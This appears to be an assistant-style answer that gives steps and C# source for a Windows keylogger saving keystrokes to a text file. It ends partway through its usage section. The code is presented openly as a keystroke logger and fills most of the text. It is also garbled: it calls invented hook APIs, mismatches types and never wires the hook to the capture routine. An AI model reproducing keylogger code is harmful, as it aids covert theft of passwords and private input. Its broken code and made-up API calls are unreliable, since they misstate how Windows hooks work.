To write a keystroke-logging application in C# that captures and saves keystrokes on a Windows computer, follow these steps:

### Step-by-Step Explanation and Code

1. **Import Necessary Namespaces:**
   - Use `System.Windows.Forms` for UI elements.
   - Use `System.Threading` for multithreading.
   - Use `System.IO` for file operations.

2. **Create a Class to Handle Keystroke Logging:**
   - Define a class `KeystrokeLogger` with private fields for the hook, last key, and a list of keystrokes.

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` to install a keyboard hook.
   - Handle exceptions if the hook cannot be installed.

4. **Capture Keystroke Events:**
   - Use `GetAsyncKeyState` to check key states on each key press.
   - Record the timestamp and key pressed or released.

5. **Save Keystrokes Periodically:**
   - Use a `Timer` to save keystrokes to a text file every few seconds.

6. **Inform User:**
   - Show a message to the user indicating that keystrokes are being logged.

7. **Uninstall the Hook:**
   - Use `UnsetWindowsHook` to remove the hook when done.

### Code

```csharp
using System;
using System.Windows.Forms;
using System.Threading;
using System.IO;
using System.Collections.Generic;

public class KeystrokeLogger
{
    private static readonly object locker = new object();
    private static int hookID;
    private static bool isHooked;
    private static KeyboardState lastKeyboardState;
    private static List<Keystroke> keystrokes = new List<Keystroke>();
    private static Timer saveTimer;
    private static bool isSaving = false;

    public class Keystroke
    {
        public int Time { get; set; }
        public Keys Key { get; set; }
        public bool IsPressed { get; set; }
    }

    public KeystrokeLogger()
    {
        InitializeTimer();
    }

    private void InitializeTimer()
    {
        saveTimer = new Timer();
        saveTimer.Interval = 5000; // Save every 5 seconds
        saveTimer.Elapsed += SaveKeystrokes;
        saveTimer.Start();
    }

    public static void StartLogging()
    {
        lock (locker)
        {
            if (isHooked)
                return;

            try
            {
                hookID = SetWindowsHook(WindowsHooks.WPF.WPF_KEYBOARDHOOK, KeyDown);
                isHooked = true;
                ShowMessage();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK);
                isHooked = false;
            }
        }
    }

    public static void StopLogging()
    {
        lock (locker)
        {
            if (!isHooked)
                return;

            try
            {
                UnsetWindowsHook(hookID);
                isHooked = false;
                saveTimer.Stop();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK);
            }
        }
    }

    private static int KeyDown = (int)(IntPtr)0;
    private static int KeyUp = (int)(IntPtr)1;

    private static int SetWindowsHook(int type, int thread)
    {
        return SetWindowsHookInternal(type, thread);
    }

    private static int SetWindowsHookInternal(int type, int thread)
    {
        return (int)User32.SetWindowsHook(type, thread);
    }

    private static int UnsetWindowsHook(int id)
    {
        return (int)User32.UnsetWindowsHook(id);
    }

    private static bool GetAsyncKeyState(IntPtr hwnd, int id, int state)
    {
        return (GetAsyncKeyStateInternal(hwnd, id) & state) != 0;
    }

    private static int GetAsyncKeyStateInternal(IntPtr hwnd, int id)
    {
        return User32.GetAsyncKeyState(hwnd, id);
    }

    private void CaptureKeystroke(object sender, Keystroke e)
    {
        lock (locker)
        {
            if (isHooked)
            {
                Keys key = (Keys)GetAsyncKeyState(sender, e.Key, KeyDown | KeyUp);
                if (key != lastKeyboardState)
                {
                    lastKeyboardState = key;
                    Keystroke stroke = new Keystroke
                    {
                        Time = DateTime.Now.ToString("HH:mm:ss.fff"),
                        Key = key,
                        IsPressed = GetAsyncKeyState(sender, key, KeyDown)
                    };
                    keystrokes.Add(stroke);
                    if (!isSaving)
                        saveTimer.Start();
                }
            }
        }
    }

    private void SaveKeystrokes(object sender, EventArgs e)
    {
        lock (locker)
        {
            if (!isHooked || keystrokes.Count == 0)
                return;

            if (isSaving)
                return;

            isSaving = true;
            try
            {
                using (StreamWriter writer = new StreamWriter(File.Create("keystrokes.txt"), append: false))
                {
                    foreach (Keystroke stroke in keystrokes)
                    {
                        writer.WriteLine($"{stroke.Time} - {stroke.Key}");
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK);
            }
            isSaving = false;
        }
    }

    private static void ShowMessage()
    {
        MessageBox.Show("Keystroke logging has started. Keystrokes are saved to 'keystrokes.txt'.", "Keystroke Logger", MessageBoxButtons.OK);
    }
}

public class Program
{
    [STAThread]
    public static void Main(string[] args)
    {
        Application.EnableVisualStyles();
        Application.Run(new MessageQueue(), new KeystrokeLogger());
    }
}
```

### Explanation

- **KeystrokeLogger Class:** Manages the keyboard hook setup, keystroke capture, and storage.
- **Keystroke Class:** Represents each keystroke with a timestamp and key information.
- **Timer:** Saves captured keystrokes every 5 seconds to a text file named `keystrokes.txt`.
- **Hook Management:** Uses `SetWindowsHook` and `UnsetWindowsHook` to install and remove the keyboard hook.
- **User Notification:** Informs the user that keystrokes are being logged.
- **Error Handling:** Manages exceptions gracefully and ensures the hook is removed on error or exit.

### Usage

1. **Start Logging:** Run the application and call `KeystrokeLogger.StartLogging()`.
